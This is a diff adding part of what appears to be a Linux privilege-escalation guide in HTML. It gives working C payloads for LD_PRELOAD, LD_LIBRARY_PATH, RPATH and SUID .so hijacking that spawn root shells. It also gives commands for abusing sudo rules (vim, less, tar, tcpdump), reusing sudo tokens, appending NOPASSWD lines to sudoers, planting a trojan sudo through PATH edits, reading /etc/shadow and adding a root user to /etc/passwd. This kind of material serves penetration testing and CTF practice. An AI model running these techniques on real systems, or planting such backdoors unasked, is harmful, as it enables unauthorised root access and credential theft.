+sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
+sudo tar c a.tar -I ./runme.sh a
+ftp&gt;!/bin/sh
+less&gt;! &lt;shell_comand&gt;
+</code></pre>
+<h3 id="nopasswd"><a class="header" href="#nopasswd">NOPASSWD</a></h3>
+<p>Sudo configuration might allow a user to execute some command with another user's privileges without knowing the password.</p>
+<pre><code>$ sudo -l
+User demo may run the following commands on crashlab:
+    (root) NOPASSWD: /usr/bin/vim
+</code></pre>
+<p>In this example the user <code>demo</code> can run <code>vim</code> as <code>root</code>, it is now trivial to get a shell by adding an ssh key into the root directory or by calling <code>sh</code>.</p>
+<pre><code>sudo vim -c '!sh'
+</code></pre>
+<h3 id="setenv"><a class="header" href="#setenv">SETENV</a></h3>
+<p>This directive allows the user to <strong>set an environment variable</strong> while executing something:</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">$ sudo -l
+User waldo may run the following commands on admirer:
+    (ALL) SETENV: /opt/scripts/admin_tasks.sh
+</code></pre>
+<p>This example, <strong>based on HTB machine Admirer</strong>, was <strong>vulnerable</strong> to <strong>PYTHONPATH hijacking</strong> to load an arbitrary python library while executing the script as root:</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
+</code></pre>
+<h3 id="sudo-execution-bypassing-paths"><a class="header" href="#sudo-execution-bypassing-paths">Sudo execution bypassing paths</a></h3>
+<p><strong>Jump</strong> to read other files or use <strong>symlinks</strong>. For example in sudoers file: <em>hacker10 ALL= (root) /bin/less /var/log/*</em></p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">sudo less /var/logs/anything
+less&gt;:e /etc/shadow #Jump to read other files using privileged less
+</code></pre>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">ln /etc/shadow /var/log/new
+sudo less /var/log/new #Use symlinks to read any file
+</code></pre>
+<p>If a <strong>wildcard</strong> is used (*), it is even easier:</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">sudo less /var/log/../../etc/shadow #Read shadow
+sudo less /var/log/something /etc/shadow #Red 2 files
+</code></pre>
+<p><strong>Countermeasures</strong>: <a href="https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/">https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/</a></p>
+<h3 id="sudo-commandsuid-binary-without-command-path"><a class="header" href="#sudo-commandsuid-binary-without-command-path">Sudo command/SUID binary without command path</a></h3>
+<p>If the <strong>sudo permission</strong> is given to a single command <strong>without specifying the path</strong>: <em>hacker10 ALL= (root) less</em> you can exploit it by changing the PATH variable</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">export PATH=/tmp:$PATH
+#Put your backdoor in /tmp and name it "less"
+sudo less
+</code></pre>
+<p>This technique can also be used if a <strong>suid</strong> binary <strong>executes another command without specifying the path to it (always check with</strong> <em><strong>strings</strong></em> <strong>the content of a weird SUID binary)</strong>.</p>
+<p><a href="payloads-to-execute.html">Payload examples to execute.</a></p>
+<h3 id="suid-binary-with-command-path"><a class="header" href="#suid-binary-with-command-path">SUID binary with command path</a></h3>
+<p>If the <strong>suid</strong> binary <strong>executes another command specifying the path</strong>, then, you can try to <strong>export a function</strong> named as the command that the suid file is calling.</p>
+<p>For example, if a suid binary calls <em><strong>/usr/sbin/service apache2 start</strong></em> you have to try to create the function and export it:</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">function /usr/sbin/service() { cp /bin/bash /tmp &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p; }
+export -f /usr/sbin/service
+</code></pre>
+<p>Then, when you call the suid binary, this function will be executed</p>
+<h3 id="ld_preload--ld_library_path"><a class="header" href="#ld_preload--ld_library_path">LD_PRELOAD &amp; <strong>LD_LIBRARY_PATH</strong></a></h3>
+<p>The <strong>LD_PRELOAD</strong> environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (<code>libc.so</code>). This process is known as preloading a library.</p>
+<p>However, to maintain system security and prevent this feature from being exploited, particularly with <strong>suid/sgid</strong> executables, the system enforces certain conditions:</p>
+<ul>
+<li>The loader disregards <strong>LD_PRELOAD</strong> for executables where the real user ID (<em>ruid</em>) does not match the effective user ID (<em>euid</em>).</li>
+<li>For executables with suid/sgid, only libraries in standard paths that are also suid/sgid are preloaded.</li>
+</ul>
+<p>Privilege escalation can occur if you have the ability to execute commands with <code>sudo</code> and the output of <code>sudo -l</code> includes the statement <strong>env_keep+=LD_PRELOAD</strong>. This configuration allows the <strong>LD_PRELOAD</strong> environment variable to persist and be recognized even when commands are run with <code>sudo</code>, potentially leading to the execution of arbitrary code with elevated privileges.</p>
+<pre><code>Defaults        env_keep += LD_PRELOAD
+</code></pre>
+<p>Save as <strong>/tmp/pe.c</strong></p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">c</span></div>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+</code></pre>
+<p>Then <strong>compile it</strong> using:</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">cd /tmp
+gcc -fPIC -shared -o pe.so pe.c -nostartfiles
+</code></pre>
+<p>Finally, <strong>escalate privileges</strong> running</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">sudo LD_PRELOAD=./pe.so &lt;COMMAND&gt; #Use any command you can run with sudo
+</code></pre>
+<div class="mdbook-alerts mdbook-alerts-caution">
+<p class="mdbook-alerts-title">
+  <span class="mdbook-alerts-icon"></span>
+  caution
+</p>
+<p>A similar privesc can be abused if the attacker controls the <strong>LD_LIBRARY_PATH</strong> env variable because he controls the path where libraries are going to be searched.</p>
+</div>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">c</span></div>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+        unsetenv("LD_LIBRARY_PATH");
+        setresuid(0,0,0);
+        system("/bin/bash -p");
+}
+</code></pre>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash"># Compile &amp; execute
+cd /tmp
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+sudo LD_LIBRARY_PATH=/tmp &lt;COMMAND&gt;
+</code></pre>
+<h3 id="suid-binary--so-injection"><a class="header" href="#suid-binary--so-injection">SUID Binary – .so injection</a></h3>
+<p>When encountering a binary with <strong>SUID</strong> permissions that seems unusual, it's a good practice to verify if it's loading <strong>.so</strong> files properly. This can be checked by running the following command:</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">strace &lt;SUID-BINARY&gt; 2&gt;&amp;1 | grep -i -E "open|access|no such file"
+</code></pre>
+<p>For instance, encountering an error like <em>"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"</em> suggests a potential for exploitation.</p>
+<p>To exploit this, one would proceed by creating a C file, say <em>"/path/to/.config/libcalc.c"</em>, containing the following code:</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">c</span></div>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+static void inject() __attribute__((constructor));
+
+void inject(){
+    system("cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p");
+}
+</code></pre>
+<p>This code, once compiled and executed, aims to elevate privileges by manipulating file permissions and executing a shell with elevated privileges.</p>
+<p>Compile the above C file into a shared object (.so) file with:</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
+</code></pre>
+<p>Finally, running the affected SUID binary should trigger the exploit, allowing for potential system compromise.</p>
+<h2 id="shared-object-hijacking"><a class="header" href="#shared-object-hijacking">Shared Object Hijacking</a></h2>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash"># Lets find a SUID using a non-standard library
+ldd some_suid
+something.so =&gt; /lib/x86_64-linux-gnu/something.so
+
+# The SUID also loads libraries from a custom location where we can write
+readelf -d payroll  | grep PATH
+0x000000000000001d (RUNPATH)            Library runpath: [/development]
+</code></pre>
+<p>Now that we have found a SUID binary loading a library from a folder where we can write, lets create the library in that folder with the necessary name:</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">c</span></div>
+<pre><code class="language-c">//gcc src.c -fPIC -shared -o /development/libshared.so
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+        setresuid(0,0,0);
+        system("/bin/bash -p");
+}
+</code></pre>
+<p>If you get an error such as</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">shell-session</span></div>
+<pre><code class="language-shell-session">./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
+</code></pre>
+<p>that means that the library you have generated need to have a function called <code>a_function_name</code>.</p>
+<h3 id="gtfobins"><a class="header" href="#gtfobins">GTFOBins</a></h3>
+<p><a href="https://gtfobins.github.io"><strong>GTFOBins</strong></a> is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions. <a href="https://gtfoargs.github.io/"><strong>GTFOArgs</strong></a> is the same but for cases where you can <strong>only inject arguments</strong> in a command.</p>
+<p>The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.</p>
+<blockquote>
+<p>gdb -nx -ex '!sh' -ex quit<br />
+sudo mysql -e '! /bin/sh'<br />
+strace -o /dev/null /bin/sh<br />
+sudo awk 'BEGIN {system("/bin/sh")}'</p>
+</blockquote>
+<p><a class="content_ref" href="https://gtfobins.github.io/"><span class="content_ref_label">\n            \n            GTFOBins\n        </span></a></p>
+<p><a class="content_ref" href="https://gtfoargs.github.io/"><span class="content_ref_label">\n            \n            GTFOArgs\n        </span></a></p>
+<h3 id="fallofsudo"><a class="header" href="#fallofsudo">FallOfSudo</a></h3>
+<p>If you can access <code>sudo -l</code> you can use the tool <a href="https://github.com/CyberOne-Security/FallofSudo"><strong>FallOfSudo</strong></a> to check if it finds how to exploit any sudo rule.</p>
+<h3 id="reusing-sudo-tokens"><a class="header" href="#reusing-sudo-tokens">Reusing Sudo Tokens</a></h3>
+<p>In cases where you have <strong>sudo access</strong> but not the password, you can escalate privileges by <strong>waiting for a sudo command execution and then hijacking the session token</strong>.</p>
+<p>Requirements to escalate privileges:</p>
+<ul>
+<li>You already have a shell as user "<em>sampleuser</em>"</li>
+<li>"<em>sampleuser</em>" have <strong>used <code>sudo</code></strong> to execute something in the <strong>last 15mins</strong> (by default that's the duration of the sudo token that allows us to use <code>sudo</code> without introducing any password)</li>
+<li><code>cat /proc/sys/kernel/yama/ptrace_scope</code> is 0</li>
+<li><code>gdb</code> is accessible (you can be able to upload it)</li>
+</ul>
+<p>(You can temporarily enable <code>ptrace_scope</code> with <code>echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope</code> or permanently modifying <code>/etc/sysctl.d/10-ptrace.conf</code> and setting <code>kernel.yama.ptrace_scope = 0</code>)</p>
+<p>If all these requirements are met, <strong>you can escalate privileges using:</strong> <a href="https://github.com/nongiach/sudo_inject"><strong>https://github.com/nongiach/sudo_inject</strong></a></p>
+<ul>
+<li>The <strong>first exploit</strong> (<code>exploit.sh</code>) will create the binary <code>activate_sudo_token</code> in <em>/tmp</em>. You can use it to <strong>activate the sudo token in your session</strong> (you won't get automatically a root shell, do <code>sudo su</code>):</li>
+</ul>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">bash exploit.sh
+/tmp/activate_sudo_token
+sudo su
+</code></pre>
+<ul>
+<li>The <strong>second exploit</strong> (<code>exploit_v2.sh</code>) will create a sh shell in <em>/tmp</em> <strong>owned by root with setuid</strong></li>
+</ul>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">bash exploit_v2.sh
+/tmp/sh -p
+</code></pre>
+<ul>
+<li>The <strong>third exploit</strong> (<code>exploit_v3.sh</code>) will <strong>create a sudoers file</strong> that makes <strong>sudo tokens eternal and allows all users to use sudo</strong></li>
+</ul>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">bash exploit_v3.sh
+sudo su
+</code></pre>
+<h3 id="varrunsudotsusername"><a class="header" href="#varrunsudotsusername">/var/run/sudo/ts/&lt;Username&gt;</a></h3>
+<p>If you have <strong>write permissions</strong> in the folder or on any of the created files inside the folder you can use the binary <a href="https://github.com/nongiach/sudo_inject/tree/master/extra_tools"><strong>write_sudo_token</strong></a> to <strong>create a sudo token for a user and PID</strong>.<br />
+For example, if you can overwrite the file <em>/var/run/sudo/ts/sampleuser</em> and you have a shell as that user with PID 1234, you can <strong>obtain sudo privileges</strong> without needing to know the password doing:</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">./write_sudo_token 1234 &gt; /var/run/sudo/ts/sampleuser
+</code></pre>
+<h3 id="etcsudoers-etcsudoersd"><a class="header" href="#etcsudoers-etcsudoersd">/etc/sudoers, /etc/sudoers.d</a></h3>
+<p>The file <code>/etc/sudoers</code> and the files inside <code>/etc/sudoers.d</code> configure who can use <code>sudo</code> and how. These files <strong>by default can only be read by user root and group root</strong>.<br />
+<strong>If</strong> you can <strong>read</strong> this file you could be able to <strong>obtain some interesting information</strong>, and if you can <strong>write</strong> any file you will be able to <strong>escalate privileges</strong>.</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">ls -l /etc/sudoers /etc/sudoers.d/
+ls -ld /etc/sudoers.d/
+</code></pre>
+<p>If you can write you can abuse this permission</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" &gt;&gt; /etc/sudoers
+echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" &gt;&gt; /etc/sudoers.d/README
+</code></pre>
+<p>Another way to abuse these permissions:</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash"># makes it so every terminal can sudo
+echo "Defaults !tty_tickets" &gt; /etc/sudoers.d/win
+# makes it so sudo never times out
+echo "Defaults timestamp_timeout=-1" &gt;&gt; /etc/sudoers.d/win
+</code></pre>
+<h3 id="doas"><a class="header" href="#doas">DOAS</a></h3>
+<p>There are some alternatives to the <code>sudo</code> binary such as <code>doas</code> for OpenBSD, remember to check its configuration at <code>/etc/doas.conf</code></p>
+<pre><code>permit nopass demo as root cmd vim
+</code></pre>
+<h3 id="sudo-hijacking"><a class="header" href="#sudo-hijacking">Sudo Hijacking</a></h3>
+<p>If you know that a <strong>user usually connects to a machine and uses <code>sudo</code></strong> to escalate privileges and you got a shell within that user context, you can <strong>create a new sudo executable</strong> that will execute your code as root and then the user's command. Then, <strong>modify the $PATH</strong> of the user context (for example adding the new path in .bash_profile) so when the user executes sudo, your sudo executable is executed.</p>
+<p>Note that if the user uses a different shell (not bash) you will need to modify other files to add the new path. For example<a href="https://github.com/APTy/sudo-piggyback"> sudo-piggyback</a> modifies <code>~/.bashrc</code>, <code>~/.zshrc</code>, <code>~/.bash_profile</code>. You can find another example in <a href="https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py">bashdoor.py</a></p>
+<p>Or running something like:</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">cat &gt;/tmp/sudo &lt;&lt;EOF
+#!/bin/bash
+/usr/bin/sudo whoami &gt; /tmp/privesc
+/usr/bin/sudo "\$@"
+EOF
+chmod +x /tmp/sudo
+echo ‘export PATH=/tmp:$PATH’ &gt;&gt; $HOME/.zshenv # or ".bashrc" or any other
+
+# From the victim
+zsh
+echo $PATH
+sudo ls
+</code></pre>
+<h2 id="shared-library"><a class="header" href="#shared-library">Shared Library</a></h2>
+<h3 id="ldso"><a class="header" href="#ldso">ld.so</a></h3>
+<p>The file <code>/etc/ld.so.conf</code> indicates <strong>where the loaded configurations files are from</strong>. Typically, this file contains the following path: <code>include /etc/ld.so.conf.d/*.conf</code></p>
+<p>That means that the configuration files from <code>/etc/ld.so.conf.d/*.conf</code> will be read. This configuration files <strong>points to other folders</strong> where <strong>libraries</strong> are going to be <strong>searched</strong> for. For example, the content of <code>/etc/ld.so.conf.d/libc.conf</code> is <code>/usr/local/lib</code>. <strong>This means that the system will search for libraries inside <code>/usr/local/lib</code></strong>.</p>
+<p>If for some reason <strong>a user has write permissions</strong> on any of the paths indicated: <code>/etc/ld.so.conf</code>, <code>/etc/ld.so.conf.d/</code>, any file inside <code>/etc/ld.so.conf.d/</code> or any folder within the config file inside <code>/etc/ld.so.conf.d/*.conf</code> he may be able to escalate privileges.<br />
+Take a look at <strong>how to exploit this misconfiguration</strong> in the following page:</p>
+<p><a class="content_ref" href="ld.so.conf-example.html"><span class="content_ref_label">ld.so privesc exploit example</span></a></p>
+<h3 id="rpath"><a class="header" href="#rpath">RPATH</a></h3>
+<pre><code>level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
+ 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
+ 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]
+
+level15@nebula:/home/flag15$ ldd ./flag15
+ linux-gate.so.1 =&gt;  (0x0068c000)
+ libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0x00110000)
+ /lib/ld-linux.so.2 (0x005bb000)
+</code></pre>
+<p>By copying the lib into <code>/var/tmp/flag15/</code> it will be used by the program in this place as specified in the <code>RPATH</code> variable.</p>
+<pre><code>level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/
+
+level15@nebula:/home/flag15$ ldd ./flag15
+ linux-gate.so.1 =&gt;  (0x005b0000)
+ libc.so.6 =&gt; /var/tmp/flag15/libc.so.6 (0x00110000)
+ /lib/ld-linux.so.2 (0x00737000)
+</code></pre>
+<p>Then create an evil library in <code>/var/tmp</code> with <code>gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6</code></p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">c</span></div>
+<pre><code class="language-c">#include&lt;stdlib.h&gt;
+#define SHELL "/bin/sh"
+
+int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
+{
+ char *file = SHELL;
+ char *argv[] = {SHELL,0};
+ setresuid(geteuid(),geteuid(), geteuid());
+ execve(file,argv,0);
+}
+</code></pre>
+<h2 id="capabilities"><a class="header" href="#capabilities">Capabilities</a></h2>
+<p>Linux capabilities provide a <strong>subset of the available root privileges to a process</strong>. This effectively breaks up root <strong>privileges into smaller and distinctive units</strong>. Each of these units can then be independently granted to processes. This way the full set of privileges is reduced, decreasing the risks of exploitation.<br />
+Read the following page to <strong>learn more about capabilities and how to abuse them</strong>:</p>
+<p><a class="content_ref" href="linux-capabilities.html"><span class="content_ref_label">Linux Capabilities</span></a></p>
+<h2 id="directory-permissions"><a class="header" href="#directory-permissions">Directory permissions</a></h2>
+<p>In a directory, the <strong>bit for "execute"</strong> implies that the user affected can "<strong>cd</strong>" into the folder.<br />
+The <strong>"read"</strong> bit implies the user can <strong>list</strong> the <strong>files</strong>, and the <strong>"write"</strong> bit implies the user can <strong>delete</strong> and <strong>create</strong> new <strong>files</strong>.</p>
+<h2 id="acls"><a class="header" href="#acls">ACLs</a></h2>
+<p>Access Control Lists (ACLs) represent the secondary layer of discretionary permissions, capable of <strong>overriding the traditional ugo/rwx permissions</strong>. These permissions enhance control over file or directory access by allowing or denying rights to specific users who are not the owners or part of the group. This level of <strong>granularity ensures more precise access management</strong>. Further details can be found <a href="https://linuxconfig.org/how-to-manage-acls-on-linux"><strong>here</strong></a>.</p>
+<p><strong>Give</strong> user "kali" read and write permissions over a file:</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">setfacl -m u:kali:rw file.txt
+#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)
+
+setfacl -b file.txt #Remove the ACL of the file
+</code></pre>
+<p><strong>Get</strong> files with specific ACLs from the system:</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2&gt;/dev/null
+</code></pre>
+<h2 id="open-shell-sessions"><a class="header" href="#open-shell-sessions">Open shell sessions</a></h2>
+<p>In <strong>old versions</strong> you may <strong>hijack</strong> some <strong>shell</strong> session of a different user (<strong>root</strong>).<br />
+In <strong>newest versions</strong> you will be able to <strong>connect</strong> to screen sessions only of <strong>your own user</strong>. However, you could find <strong>interesting information inside the session</strong>.</p>
+<h3 id="screen-sessions-hijacking"><a class="header" href="#screen-sessions-hijacking">screen sessions hijacking</a></h3>
+<p><strong>List screen sessions</strong></p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">screen -ls
+screen -ls &lt;username&gt;/ # Show another user' screen sessions
+</code></pre>
+<p><img src="../../images/image%20(141).png" alt="" /></p>
+<p><strong>Attach to a session</strong></p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">screen -dr &lt;session&gt; #The -d is to detach whoever is attached to it
+screen -dr 3350.foo #In the example of the image
+screen -x [user]/[session id]
+</code></pre>
+<h2 id="tmux-sessions-hijacking"><a class="header" href="#tmux-sessions-hijacking">tmux sessions hijacking</a></h2>
+<p>This was a problem with <strong>old tmux versions</strong>. I wasn't able to hijack a tmux (v2.1) session created by root as a non-privileged user.</p>
+<p><strong>List tmux sessions</strong></p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">tmux ls
+ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
+tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
+</code></pre>
+<p><img src="../../images/image%20(837).png" alt="" /></p>
+<p><strong>Attach to a session</strong></p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">tmux attach -t myname #If you write something in this session it will appears in the other opened one
+tmux attach -d -t myname #First detach the session from the other console and then access it yourself
+
+ls -la /tmp/dev_sess #Check who can access it
+rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
+# If you are root or devs you can access it
+tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
+</code></pre>
+<p>Check <strong>Valentine box from HTB</strong> for an example.</p>
+<h2 id="ssh"><a class="header" href="#ssh">SSH</a></h2>
+<h3 id="debian-openssl-predictable-prng---cve-2008-0166"><a class="header" href="#debian-openssl-predictable-prng---cve-2008-0166">Debian OpenSSL Predictable PRNG - CVE-2008-0166</a></h3>
+<p>All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.<br />
+This bug is caused when creating a new ssh key in those OS, as <strong>only 32,768 variations were possible</strong>. This means that all the possibilities can be calculated and <strong>having the ssh public key you can search for the corresponding private key</strong>. You can find the calculated possibilities here: <a href="https://github.com/g0tmi1k/debian-ssh">https://github.com/g0tmi1k/debian-ssh</a></p>
+<h3 id="ssh-interesting-configuration-values"><a class="header" href="#ssh-interesting-configuration-values">SSH Interesting configuration values</a></h3>
+<ul>
+<li><strong>PasswordAuthentication:</strong> Specifies whether password authentication is allowed. The default is <code>no</code>.</li>
+<li><strong>PubkeyAuthentication:</strong> Specifies whether public key authentication is allowed. The default is <code>yes</code>.</li>
+<li><strong>PermitEmptyPasswords</strong>: When password authentication is allowed, it specifies whether the server allows login to accounts with empty password strings. The default is <code>no</code>.</li>
+</ul>
+<h3 id="permitrootlogin"><a class="header" href="#permitrootlogin">PermitRootLogin</a></h3>
+<p>Specifies whether root can log in using ssh, default is <code>no</code>. Possible values:</p>
+<ul>
+<li><code>yes</code>: root can login using password and private key</li>
+<li><code>without-password</code> or <code>prohibit-password</code>: root can only login with a private key</li>
+<li><code>forced-commands-only</code>: Root can login only using private key and if the commands options are specified</li>
+<li><code>no</code> : no</li>
+</ul>
+<h3 id="authorizedkeysfile"><a class="header" href="#authorizedkeysfile">AuthorizedKeysFile</a></h3>
+<p>Specifies files that contain the public keys that can be used for user authentication. It can contain tokens like <code>%h</code>, which will be replaced by the home directory. <strong>You can indicate absolute paths</strong> (starting in <code>/</code>) or <strong>relative paths from the user's home</strong>. For example:</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">AuthorizedKeysFile    .ssh/authorized_keys access
+</code></pre>
+<p>That configuration will indicate that if you try to login with the <strong>private</strong> key of the user "<strong>testusername</strong>" ssh is going to compare the public key of your key with the ones located in <code>/home/testusername/.ssh/authorized_keys</code> and <code>/home/testusername/access</code></p>
+<h3 id="forwardagentallowagentforwarding"><a class="header" href="#forwardagentallowagentforwarding">ForwardAgent/AllowAgentForwarding</a></h3>
+<p>SSH agent forwarding allows you to <strong>use your local SSH keys instead of leaving keys</strong> (without passphrases!) sitting on your server. So, you will be able to <strong>jump</strong> via ssh <strong>to a host</strong> and from there <strong>jump to another</strong> host <strong>using</strong> the <strong>key</strong> located in your <strong>initial host</strong>.</p>
+<p>You need to set this option in <code>$HOME/.ssh.config</code> like this:</p>
+<pre><code>Host example.com
+  ForwardAgent yes
+</code></pre>
+<p>Notice that if <code>Host</code> is <code>*</code> every time the user jumps to a different machine, that host will be able to access the keys (which is a security issue).</p>
+<p>The file <code>/etc/ssh_config</code> can <strong>override</strong> this <strong>options</strong> and allow or denied this configuration.<br />
+The file <code>/etc/sshd_config</code> can <strong>allow</strong> or <strong>denied</strong> ssh-agent forwarding with the keyword <code>AllowAgentForwarding</code> (default is allow).</p>
+<p>If you find that Forward Agent is configured in an environment read the following page as <strong>you may be able to abuse it to escalate privileges</strong>:</p>
+<p><a class="content_ref" href="ssh-forward-agent-exploitation.html"><span class="content_ref_label">SSH Forward Agent exploitation</span></a></p>
+<h2 id="interesting-files"><a class="header" href="#interesting-files">Interesting Files</a></h2>
+<h3 id="profiles-files"><a class="header" href="#profiles-files">Profiles files</a></h3>
+<p>The file <code>/etc/profile</code> and the files under <code>/etc/profile.d/</code> are <strong>scripts that are executed when a user runs a new shell</strong>. Therefore, if you can <strong>write or modify any of them you can escalate privileges</strong>.</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">ls -l /etc/profile /etc/profile.d/
+</code></pre>
+<p>If any weird profile script is found you should check it for <strong>sensitive details</strong>.</p>
+<h3 id="passwdshadow-files"><a class="header" href="#passwdshadow-files">Passwd/Shadow Files</a></h3>
+<p>Depending on the OS the <code>/etc/passwd</code> and <code>/etc/shadow</code> files may be using a different name or there may be a backup. Therefore it's recommended <strong>find all of them</strong> and <strong>check if you can read</strong> them to see <strong>if there are hashes</strong> inside the files:</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">#Passwd equivalent files
+cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2&gt;/dev/null
+#Shadow equivalent files
+cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2&gt;/dev/null
+</code></pre>
+<p>In some occasions you can find <strong>password hashes</strong> inside the <code>/etc/passwd</code> (or equivalent) file</p>
+<div class="codeblock_filename_container"><span class="codeblock_filename_inner hljs">bash</span></div>
+<pre><code class="language-bash">grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2&gt;/dev/null
+</code></pre>
+<h3 id="writable-etcpasswd"><a class="header" href="#writable-etcpasswd">Writable /etc/passwd</a></h3>
+<p>First, generate a password with one of the following commands.</p>
+<pre><code>openssl passwd -1 -salt hacker hacker
+mkpasswd -m SHA-512 hacker
+python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
+</code></pre>
+<p>Then add the user <code>hacker</code> and add the generated password.</p>
+<pre><code>hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
+</code></pre>
